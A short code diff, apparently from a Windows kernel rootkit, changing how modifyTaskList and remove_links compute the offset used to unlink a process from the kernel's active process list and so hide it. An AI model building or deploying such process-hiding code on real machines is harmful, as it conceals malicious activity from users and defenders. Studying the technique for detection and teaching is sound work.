@@ -11,14 +11,11 @@ void modifyTaskList(UINT32 pid) {
 	ULONG LIST_OFFSET = PID_OFFSET;
 
 
-	/* Check Architecture
-	if (IoIs32bitProcess(NULL)) {
-		LIST_OFFSET += 4;
-	}
-	else {
-		LIST_OFFSET += 8;
-	}*/
-	LIST_OFFSET += 4;
+	// Check Architecture using pointer size
+	int * ptr;
+
+	// Ptr size 8 if you are on a 64-bit machine, 4 if you are on a 32-bit machine
+	LIST_OFFSET += sizeof(ptr);
 
 	// Get current process
 	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();
@@ -69,8 +66,6 @@ void remove_links(PLIST_ENTRY Current) {
 
 	Previous = (Current->Blink);
 	Next = (Current->Flink);
-
-
 
 	// Loop over self (connect previous with next)
 	Previous->Flink = Next;
